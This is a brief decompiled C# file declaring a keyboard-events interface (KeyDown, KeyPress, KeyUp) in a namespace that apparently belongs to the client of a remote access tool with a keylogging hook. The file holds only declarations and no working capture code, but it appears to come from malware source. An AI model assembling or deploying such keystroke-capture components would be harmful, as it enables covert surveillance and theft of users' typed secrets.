using System;
using System.Windows.Forms;

namespace xClient.Core.MouseKeyHook
{
	// Token: 0x02000057 RID: 87
	public interface IKeyboardEvents
	{
		// Token: 0x14000008 RID: 8
		// (add) Token: 0x06000239 RID: 569
		// (remove) Token: 0x0600023A RID: 570
		event KeyEventHandler KeyDown;

		// Token: 0x14000009 RID: 9
		// (add) Token: 0x0600023B RID: 571
		// (remove) Token: 0x0600023C RID: 572
		event KeyPressEventHandler KeyPress;

		// Token: 0x1400000A RID: 10
		// (add) Token: 0x0600023D RID: 573
		// (remove) Token: 0x0600023E RID: 574
		event KeyEventHandler KeyUp;
	}
}
